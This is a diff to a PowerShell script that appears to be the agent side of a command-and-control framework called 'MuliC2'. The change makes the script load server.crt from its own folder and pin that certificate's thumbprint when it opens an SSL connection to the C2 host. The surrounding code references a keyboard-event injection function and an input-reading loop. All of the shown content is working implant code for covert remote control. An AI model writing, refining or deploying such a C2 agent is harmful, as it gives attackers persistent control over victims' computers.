@@ -311,7 +311,16 @@ function Invoke-KeyboardEvent {
     }
 }
 
-$expectedThumbprint = "YOUR_CERT_THUMBPRINT_HERE"  # <-- Replace with your actual cert thumbprint
+# Automatically load the server certificate from the root folder and use its thumbprint
+$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$certPath = Join-Path $scriptDir 'server.crt'
+if (-Not (Test-Path $certPath)) {
+    Write-Host "[!] server.crt not found in script directory: $scriptDir" -ForegroundColor Red
+    exit 1
+}
+$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($certPath)
+$expectedThumbprint = $cert.Thumbprint.Replace(' ', '').ToUpper()
+Write-Host "[*] Loaded server cert thumbprint: $expectedThumbprint" -ForegroundColor Cyan
 
 try {
     Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
@@ -330,7 +339,7 @@ try {
         $false,
         ([System.Net.Security.RemoteCertificateValidationCallback] {
             param($sender, $certificate, $chain, $sslPolicyErrors)
-            if ($certificate -and $certificate.GetCertHashString() -eq $expectedThumbprint) {
+            if ($certificate -and $certificate.GetCertHashString().ToUpper() -eq $expectedThumbprint) {
                 return $true
             }
             Write-Host "[!] Certificate thumbprint mismatch: $($certificate.GetCertHashString())" -ForegroundColor Red
@@ -419,7 +428,7 @@ try {
             } else {
                 Write-Host "[DEBUG] No SSL data available" -ForegroundColor DarkGray
             }
-        } catch {
+    } catch {
             # Input reading errors are non-fatal, just log and continue
             Write-Host "[!] Input reading error: $($_.Exception.Message)" -ForegroundColor Yellow
         }
